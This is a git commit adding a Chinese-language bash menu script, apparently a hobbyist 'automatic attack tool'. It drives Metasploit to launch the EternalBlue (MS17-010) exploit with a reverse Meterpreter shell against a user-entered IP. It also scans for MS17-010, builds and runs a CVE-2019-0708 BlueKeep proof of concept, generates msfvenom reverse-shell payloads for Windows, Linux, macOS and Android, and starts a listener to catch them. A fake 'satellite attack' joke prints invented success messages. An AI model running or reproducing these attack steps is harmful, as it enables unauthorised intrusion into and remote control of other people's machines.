21cfecc0cb83f8f11ac1424f99cde5302fc4c111
CatGamesGa0 <50813806+CatGamesGa0@users.noreply.github.com>
2019-06-19 10:58:53 +0800

    1.2Beta版

---
+++ 1.2Beta.sh
@@ -0,0 +1,335 @@
+﻿: '
+                                         ,s555SB@@&                          
+                                     :9H####@@@@@Xi                        
+                                     1@@@@@@@@@@@@@@8                       
+                                   ,8@@@@@@@@@B@@@@@@8                      
+                                  :B@@@@X3hi8Bs;B@@@@@Ah,                   
+             ,8i                  r@@@B:     1S ,M@@@@@@#8;                 
+            1AB35.i:               X@@8 .   SGhr ,A@@@@@@@@S                
+            1@h31MX8                18Hhh3i .i3r ,A@@@@@@@@@5               
+            ;@&i,58r5                 rGSS:     :B@@@@@@@@@@A               
+             1#i  . 9i                 hX.  .: .5@@@@@@@@@@@1               
+              sG1,  ,G53s.              9#Xi;hS5 3B@@@@@@@B1                
+               .h8h.,A@@@MXSs,           #@H1:    3ssSSX@1                  
+               s ,@@@@@@@@@@@@Xhi,       r#@@X1s9M8    .GA981               
+               ,. rS8H#@@@@@@@@@@#HG51;.  .h31i;9@r    .8@@@@BS;i;          
+                .19AXXXAB@@@@@@@@@@@@@@#MHXG893hrX#XGGXM@@@@@@@@@@MS        
+                s@@MM@@@hsX#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&,      
+              :GB@#3G@@Brs ,1GM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B,     
+            .hM@@@#@@#MX 51  r;iSGAM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8     
+          :3B@@@@@@@@@@@&9@h :Gs   .;sSXH@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:    
+      s&HA#@@@@@@@@@@@@@@M89A;.8S.       ,r3@@@@@@@@@@@@@@@@@@@@@@@@@@@r    
+    ,13B@@@@@@@@@@@@@@@@@@@5 5B3 ;.         ;@@@@@@@@@@@@@@@@@@@@@@@@@@@i    
+  5#@@#&@@@@@@@@@@@@@@@@@@9  .39:          ;@@@@@@@@@@@@@@@@@@@@@@@@@@@;    
+  9@@@X:MM@@@@@@@@@@@@@@@#;    ;31.         H@@@@@@@@@@@@@@@@@@@@@@@@@@:    
+   SH#@B9.rM@@@@@@@@@@@@@B       :.         3@@@@@@@@@@@@@@@@@@@@@@@@@@5    
+     ,:.   9@@@@@@@@@@@#HB5                 .M@@@@@@@@@@@@@@@@@@@@@@@@@B    
+           ,ssirhSM@&1;i19911i,.             s@@@@@@@@@@@@@@@@@@@@@@@@@@S   
+              ,,,rHAri1h1rh&@#353Sh:          8@@@@@@@@@@@@@@@@@@@@@@@@@#:  
+            .A3hH@#5S553&@@#h   i:i9S          #@@@@@@@@@@@@@@@@@@@@@@@@@A.
+            又来看代码了！
+            '
+
+Initialization_Tools(){
+	clear	
+	echo -e "\033[31mCatGames自动攻击工具初始化中......\033[0m"
+	b=''
+	for ((i=0;$i<=100;i+=2))
+	do
+        printf "Loading:[%-50s]%d%%\r" $b $i
+        sleep 0.1
+        b=#$b
+	done
+	echo
+	clear 
+
+}
+CatGames_LoGo(){
+	echo -e " _____       ___   _____   _____       ___       ___  ___   _____   _____  
+/  ___|     /   | |_   _| /  ___|     /   |     /   |/   | | ____| /  ___/ 
+| |        / /| |   | |   | |        / /| |    / /|   /| | | |__   | |___  
+| |       / / | |   | |   | |  _    / / | |   / / |__/ | | |  __|  \___  \ 
+| |___   / /  | |   | |   | |_| |  / /  | |  / /       | | | |___   ___| | 
+\_____| /_/   |_|   |_|   \_____/ /_/   |_| /_/        |_| |_____| /_____/ 
+        "
+echo -e "By_CatGamesGa0       CatGames.cn Email：Ga0CatGames@cumt.edu.cn" 
+}
+CatGames_CaoNiMa(){
+	echo -e "
+       ┏┓　 ┏┓ 
+      ┏┛┻━━━┛┻┓ 
+      ┃　　　 ┃ 　 
+      ┃　 ━   ┃ 
+      ┃┳┛　┗┳ ┃ 
+      ┃　　　 ┃ 
+      ┃　┻　　┃ 
+      ┃　　 　┃ 
+      ┗━┓　 ┏━┛ 
+        ┃　 ┃
+        ┃　 ┃ By_CatGames
+        ┃　 ┗━━━┓ 
+        ┃　   　┣┓ 
+        ┃　　　┏┛ 
+        ┗┓┓┏━┳┓┏┛ 
+         ┃┫┫　┃┫┫ 
+         ┗┻┛　┗┻┛
+"
+echo -e "\n"
+}
+CatGames_China_No-1(){
+		echo -e " \e[31m_____   _   _   _   __   _       ___        __   _   _____        ___  
+\e[31m/  ___| | | | | | | |  \ | |     /   |      |  \ | | /  _  \      |_  | 
+\e[31m| |     | |_| | | | |   \| |    / /| |      |   \| | | | | |        | | 
+\e[31m| |     |  _  | | | | |\   |   / / | |      | |\   | | | | |        | | 
+\e[31m| |___  | | | | | | | | \  |  / /  | |      | | \  | | |_| |        | | 
+\e[31m\_____| |_| |_| |_| |_|  \_| /_/   |_|      |_|  \_| \_____/        |_| 
+
+        "
+}
+eternalblue_AuToExP(){
+echo -e "\E[1;33m:::::::::::::: \e[97mMsf自动执行攻击脚本 \E[1;33m:::::::::::::::"
+echo -e "\E[1;33m:::::::::::::: \e[97m攻防无绝对|技术无黑白 \E[1;33m:::::::::::::::"
+CatGames_CaoNiMa
+echo -e "\E[1;33m:::::::::::::: \e[97m自动执行永恒之蓝攻击 \E[1;33m:::::::::::::::"
+#需要用户输入需要攻击的IP地址
+read -p "请输入对方IP地址：" IPAdd;  
+read -p "请输入本机IP地址：" IPme;
+#设置Eternalblue攻击模块
+#设置Payload 反弹Meterpreter
+#设置RHOSTS 为Hacker（JB小子）输入的攻击IP地址  445
+#设置LHOST 反弹地址（本机地址）反弹端口设置为4444
+msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;
+set payload windows/x64/meterpreter/reverse_tcp;
+set RHOSTS $IPAdd;set RPORT 445;
+set LHOST $IPme;set LPORT 4444;run"
+
+}
+eternalblue_AuTo_Auxiliary(){
+	echo -e "\E[1;33m:::::::::::::: \e[97mMsf自动执行攻击脚本 \E[1;33m:::::::::::::::"
+	echo -e "\E[1;33m:::::::::::::: \e[97m攻防无绝对|技术无黑白 \E[1;33m:::::::::::::::"
+	CatGames_LoGo	
+	echo -e "\E[1;33m:::::::::::::: \e[97m自动执行永恒之蓝漏洞扫描 \E[1;33m:::::::::::::::"	
+	#设置需要扫描的IP地址范围是多少 传给$IPALL
+	read -p "请输入需要扫描的IP地址范围：" IPALL;
+	read -p "请输入需要设置的扫描线程（默认1）：" thread;
+	#设置永恒之蓝扫描模块
+	##设置RHOSTS $IPALL接受用户输入值 设置端口为445
+	msfconsole -x "use auxiliary/scanner/smb/smb_ms17_010;
+	set RHOSTS $IPALL;set RPORT 445;set threads $thread;run;"
+}
+Nmap_ALL(){
+	clear
+	CatGames_LoGo
+	echo -e "[1]获取远程主机的系统类型及开放端口"
+	echo -e "[2]在网络寻找所有在线主机"
+	echo -e "[3]Ping 指定范围内的 IP 地址"
+	echo -e "[4]获取主机系统类型"
+	echo -e "[5]指定端口扫描"
+	echo -e ""
+	read -p "请输入您需要执行的功能(回车退出,0返回主菜单）：" Nmap
+	case $Nmap in "1" | "1" )
+	clear
+	CatGames_LoGo
+	read -p "请输入需要扫描的IP地址：" Nmap_IP
+	nmap -sS -P0 -sV -O $Nmap_IP
+		;;
+	"2" | "2" )	
+	clear
+	CatGames_LoGo
+	read -p "请输入需要寻在在线主机的IP段(例:192.168.0.0/24)：" Nmap_IIP
+	nmap -sP $Nmap_IIP
+	;;
+	"3" | "3" )
+	clear
+	CatGames_LoGo
+	read -p "请输入你需要指定Ping的IP地址范围(例:192.168.1.100-254)：" Nmap_IIIP
+	nmap -sP $Nmap_IIIP
+	;;
+	"4" | "4" )
+	clear 
+	CatGames_LoGo
+	read -p "请输入需要获取主机类型的IP地址：" Nmap_IIIIP
+	nmap -O $Nmap_IIIIP
+	;;
+	"5" | "5" )
+	clear
+	CatGames_LoGo
+	read -p "请输入端口号：" Nmap_PORT
+	read -p "请输入IP地址：" Nmap_IIIIIP
+	nmap -p $Nmap_PORT $Nmap_IIIIIP
+	;;
+	"0" | "0" )
+	clear
+	CatGames_MenUI
+	esac
+	exit
+
+}
+Get_Payload(){
+	clear
+	CatGames_LoGo
+	echo -e "[1]Windows"
+	echo -e "[2]Linux"
+	echo -e "[3]Mac"
+	echo -e "[4]Android"
+	read -p "选择Payload针对类型（0返回主菜单）:" Payload_1
+	case $Payload_1 in "1" | "1" )
+	read -p "请输入反弹IP：" MeIP
+	read -p "请输入反弹端口：" Me_Port
+	read -p "请输入Payload输出目录(例：tmp)：" Me_MuLu
+	msfvenom –platform windows -p windows/meterpreter/reverse_tcp LHOST=$MeIP LPORT=$Me_Port EXITFUNC=thread -b ‘\x00’ -f exe-only -o /$Me_MuLu/CatGames_payload.exe
+	echo -e "Payload生成目录在/$Me_MuLu/CatGames_Payload.exe"
+	;;	
+	"2" | "2" )
+	read -p "请输入反弹IP：" MeIP
+	read -p "请输入反弹端口：" Me_Port
+	read -p "请输入Payload输出目录(例：tmp)：" Me_MuLu
+	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$MeIP LPORT=$Me_Port -f elf > /$Me_MuLu/CatGames_Payload.elf
+	echo -e "Payload生成目录在/$Me_MuLu/CatGames_Payload.elf"
+	;;
+	"3" | "3" )
+	read -p "请输入反弹IP：" MeIP
+	read -p "请输入反弹端口：" Me_Port
+	read -p "请输入Payload输出目录(例：tmp)：" Me_MuLu
+	msfvenom -p osx/x86ell_reverse_tcp LHOST=$MeIP LPORT=$Me_Port -f macho > /$Me_MuLu/CatGames_Payload.macho
+	echo -e "Payload生成目录在/$Me_MuLu/CatGames_Payload.macho"
+	;;
+	"4" | "4" )
+	echo -e "text"
+	read -p "请输入反弹IP：" MeIP
+	read -p "请输入反弹端口：" Me_Port
+	read -p "请输入Payload输出目录(例：tmp)：" Me_MuLu
+	msfvenom -p android/meterpreter/reverse_tcp LHOST=$MeIP LPORT=$Me_Port R > /$Me_MuLu/CatGames_Payload.apk
+	echo -e "Payload生成目录在/$Me_MuLu/CatGames_Payload.apk"
+	;;
+	"0" | "0" )
+	clear
+	CatGames_MenUI
+	esac
+	exit
+}
+CatGames_Nat(){
+	echo -e "test"
+}
+CatGames_satellite(){
+	read -p "请输入需要攻击哪个国家的卫星（目前支持美国）:" satellite;
+	echo -e "您选择的是[$satellite]的卫星 "
+	read -p "请选择攻击成功后卫星掉落地点:" place;
+	echo -e "您选择的卫星坠落地点是[$place]"
+	int=1
+	while(( $int<=5 ))
+	do
+    echo -e "请等待$int秒"
+    echo -e "攻击反馈：已突破防火墙，已执行溢出，EXP攻击成功！"
+    let "int++"
+	done
+	echo -e "攻击成功，美国一颗卫星已经坠落在$place,做得好hACKER(JB小子）"
+	CatGames_China_No-1
+	echo -e "\n"
+	echo -e ""
+	read -p "【回车】返回主菜单"
+	clear
+	CatGames_MenUI
+}
+CatGames_Get_Poc(){
+	git clone https://github.com/zerosum0x0/CVE-2019-0708.git
+	cd CVE-2019-0708/rdesktop-fork-bd6aa6acddf0ba640a49834807872f4cc0d0a773/
+	apt-get install dh-autoreconf
+	apt-get install libssl-dev
+	./bootstrap
+	./configure --disable-credssp --disable-smartcard
+	make
+	read -p "请输入对方IP以及端口（3389）：" IPPOC;
+	./rdesktop $IPPOC
+}
+CatGames_Monitor(){
+	clear
+	CatGames_LoGo
+	read -p "请输入监听IP：" JTIP
+	read -p "请输入监听端口：" JTPROT
+	msfconsole -x "use exploit/multi/handler;
+	set PAYLOAD windows/meterpreter/reverse_tcp;
+	set LHOST $JTIP;set PROT $JTPROT;run;"
+}
+CatGames_About(){
+	clear
+	echo -e "感谢Cimoom_曲云杰的指点"
+	sleep 2
+	echo -e "感谢WRS戏子的指点"
+	sleep 2
+	echo -e "\033[5;31m _____       ___   _____   _____       ___       ___  ___   _____   _____  
+/  ___|     /   | |_   _| /  ___|     /   |     /   |/   | | ____| /  ___/ 
+| |        / /| |   | |   | |        / /| |    / /|   /| | | |__   | |___  
+| |       / / | |   | |   | |  _    / / | |   / / |__/ | | |  __|  \___  \ 
+| |___   / /  | |   | |   | |_| |  / /  | |  / /       | | | |___   ___| | 
+\_____| /_/   |_|   |_|   \_____/ /_/   |_| /_/        |_| |_____| /_____/  \033[0m"
+	echo -e "By_CatGamesGa0"
+}
+CatGames_MenUI(){
+echo -e "\E[1;33m:::::::::::::: \e[97mCatGamesGa0自动执行攻击脚本 \E[1;33m:::::::::::::::"
+echo -e "\E[1;33m:::::::::::::: \e[97m攻防无绝对|技术无黑白 \E[1;33m:::::::::::::::"
+CatGames_LoGo
+echo -e "\033[31m======================="
+echo -e "\033[31m|请输入需要使用的功能！"
+echo -e "\033[33m|[1]永恒之蓝"
+echo -e "\033[34m|[2]使用CVE-2019-0708-POC"
+echo -e "\033[35m|[3]一键日卫星"
+echo -e "\033[36m|[4]生成Payload"
+echo -e "\033[37m|[5]Nmap扫描" 
+echo -e "\033[31m|[6]Msf监听IP与端口"
+echo -e "\033[33m|[7]关于"
+echo -e "\033[31m======================="
+read -p "请输入您需要执行的功能(回车退出）：" Num
+case $Num in "1" | "1" )
+	clear
+	CatGames_LoGo
+	echo -e "\033[32m[1]使用永恒之蓝扫描模块"
+	echo -e "\033[32m[2]使用永恒之蓝攻击模块"
+	read -p "您选择扫描模块还是攻击模块(0返回上一层)：" mod
+	case $mod in "1" | "1" )
+		clear
+		eternalblue_AuTo_Auxiliary
+			;;
+			"2" | "2" )
+		clear
+		eternalblue_AuToExP
+			;;
+			"0" | "0" )
+		clear
+		CatGames_MenUI	
+		;;
+	esac
+	;;
+	"2" | "2" )
+	CatGames_Get_Poc
+	;;
+	"3" | "3" )
+	CatGames_satellite
+	;;
+	"4" | "4" )
+	Get_Payload
+	;;
+	"5" | "5" )
+	Nmap_ALL
+	;;
+	"6" | "6" )
+	CatGames_Monitor
+	;;
+	"7" | "7" )
+	CatGames_About
+	;;
+esac
+	exit
+}
+Initialization_Tools
+echo -e "\E[1;31m<:::::::::::::: \e[97m自动攻击工具 \E[1;31m:::::::::::::::>"
+echo -e "\E[1;31m<:::::::::::::: \e[97m攻防无绝对|技术无黑白 \E[1;31m:::::::::::::::>"
+CatGames_LoGo
+echo -e "\E[1;33m<:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::>"
+echo -e "\E[1;33m<:::::::::::::: \e[97mMetasploit service started \E[1;33m:::::::::::::::::>"
+echo -e "\E[1;33m<:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::>"
+CatGames_CaoNiMa
+read -p "初始化完成,按下【回车】开始！"
+clear
+CatGames_MenUI
+
